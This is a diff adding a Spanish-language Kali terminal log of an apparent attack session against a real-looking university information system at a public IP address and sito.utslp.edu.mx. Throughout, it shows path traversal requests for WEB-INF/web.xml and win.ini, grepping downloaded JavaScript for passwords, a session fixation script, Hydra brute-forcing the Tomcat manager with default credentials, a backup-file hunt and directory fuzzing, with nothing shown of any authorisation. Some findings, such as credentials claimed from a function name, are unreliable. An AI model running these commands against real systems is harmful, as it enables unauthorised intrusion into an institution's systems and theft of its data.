@@ -1,0 +1,166 @@
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ echo "=== PROBANDO HTTP EN PUERTO 80 ==="
+curl -v "http://189.254.143.102/examples/jsp/include/include.jsp?page=../../../WEB-INF/web.xml"
+=== PROBANDO HTTP EN PUERTO 80 ===
+*   Trying 189.254.143.102:80...
+* Connected to 189.254.143.102 (189.254.143.102) port 80
+* using HTTP/1.x
+> GET /examples/jsp/include/include.jsp?page=../../../WEB-INF/web.xml HTTP/1.1
+> Host: 189.254.143.102
+> User-Agent: curl/8.15.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 302 Movido temporalmente
+< Server: Apache-Coyote/1.1
+< Pragma: No-cache
+< Cache-Control: no-cache
+< Expires: Wed, 31 Dec 1969 18:00:00 CST
+< Location: https://189.254.143.102/examples/jsp/include/include.jsp?page=../../../WEB-INF/web.xml
+< Content-Length: 0
+< Date: Fri, 10 Oct 2025 01:38:22 GMT
+< 
+* Connection #0 to host 189.254.143.102 left intact
+
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ curl "http://189.254.143.102/examples/jsp/include/include.jsp?page=../../../../../../../../Windows/win.ini"
+                                                                                 
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ 
+
+index.jsp               [Status: 200, Size: 15938, Words: 1656, Lines: 541, Duration: 70ms]
+:: Progress: [8110/18456] :: Job [1/1] :: 584 req/sec :: Duration: [0:00:14] :: E:: Progress: [8111/18456] :: Job [1/1] :: 584 req/sec :: Duration: [0:00:14] :: Eindex.html              [Status: 200, Size: 634, Words: 55, Lines: 28, Duration: 73ms]
+:: Progress: [8122/18456] :: Job [1/1] :: 573 req/sec :: Duration: [0:00:14] :: E:: Progress: [8188/18456] :: Job [1/1] :: 607 req/sec :: Duration: [0:00:14] :: Eindex2.jsp              [Status: 200, Size: 14224, Words: 1566, Lines: 489, Duration: 147ms]
+
+                                                                                 
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ cd ..     
+                                                                                 
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux]
+└─$ cd Curls 
+                                                                                 
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Curls]
+└─$ curl -k "https://189.254.143.102/jsp/index.jsp" -o index_jsp.txt
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+                                                                                 
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Curls]
+└─$ curl -k "https://189.254.143.102/jsp/menu.jsp" -o menu_jsp.txt
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+                                                                                 
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Curls]
+└─$ grep -i "password\|user\|jdbc\|connection" *.txt
+CurlsP2.txt:Remote user: null
+                                                                                 
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Curls]
+└─$ curl -k "https://189.254.143.102/javascript/utilities.js" -o utilities.js
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  7813  100  7813    0     0  21078      0 --:--:-- --:--:-- --:--:-- 21059
+                                                                                 
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Curls]
+└─$ curl -k "https://189.254.143.102/javascript/scriptAnimaciones.js" -o scriptAnimaciones.js
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 10952  100 10952    0     0  29337      0 --:--:-- --:--:-- --:--:-- 29361
+                                                                                 
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Curls]
+└─$ grep -i "password\|passwd\|user\|login" *.js
+utilities.js:   function Password(letra){
+                                                                                 
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Curls]
+└─$ 
+
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ python3 ASesiones.py 
+=== SESSION FIXATION ATTACK ===
+✅ SESIÓN VÁLIDA: 00000000000000000000000000000000 en /jsp/menu.jsp
+✅ SESIÓN VÁLIDA: 1234567890ABCDEF1234567890ABCDEF en /jsp/menu.jsp
+✅ SESIÓN VÁLIDA: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA en /jsp/menu.jsp
+✅ SESIÓN VÁLIDA: 0123456789ABCDEF0123456789ABCDEF en /jsp/menu.jsp
+✅ SESIÓN VÁLIDA: FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF en /jsp/menu.jsp
+✅ SESIÓN VÁLIDA: 5AC92EC7B819B3474841A747FF58C063 en /jsp/menu.jsp
+                                                                                 
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ 
+
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ curl -k "https://189.254.143.102/examples/jsp/%2e%2e/%2e%2e/WEB-INF/web.xml"
+
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<title> Sistema de Informaci�n T�ctico Operativo </title>
+
+        <link rel="stylesheet" href="/styles2/pages.css" type="text/css">
+        <link rel="stylesheet" href="/styles2/tables.css" type="text/css">
+        <link rel="stylesheet" href="/styles2/cells.css" type="text/css">
+        <link rel="stylesheet" href="/styles2/characters.css" type="text/css">
+</head>
+
+<body>
+<form name="forma" method="post" action="">
+        <br>
+        <table class="TablaDatosTitulo" width="100%" align="center" cellpadding="0" cellspacing="0">
+                  <th class="CeldaDatosTitulo"> Error 404</th>
+
+
+# Fuerza bruta al manager con credenciales por defecto
+hydra -C tomcat_defaults.txt sito.utslp.edu.mx http-get /manager/html
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-09 20:06:14
+[DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries, ~1 try per task
+[DATA] attacking http-get://sito.utslp.edu.mx:80/manager/html
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-09 20:06:46
+        
+=== AUDITORÍA COMPLETA SITO UTSLP ===
+1. Probando HTTP en puerto 80...
+2. Buscando archivos de backup...
+✅ web.xml.bak ENCONTRADO
+✅ login.jsp.bak ENCONTRADO
+✅ web.xml.old ENCONTRADO
+✅ login.jsp.old ENCONTRADO
+✅ web.xml.backup ENCONTRADO
+✅ login.jsp.backup ENCONTRADO
+✅ web.xml.orig ENCONTRADO
+✅ login.jsp.orig ENCONTRADO
+✅ web.xml.save ENCONTRADO
+✅ login.jsp.save ENCONTRADO
+3. Analizando JavaScript para credenciales...
+        function Password(letra){
+✅ CREDENCIALES EN JS
+4. Probando métodos HTTP...
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+5. Fuzzing rápido de directorios...
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://189.254.143.102/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Output file      : fuzz_results.txt
+ :: File format      : json
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 10
+ :: Matcher          : Response status: 200,301,302
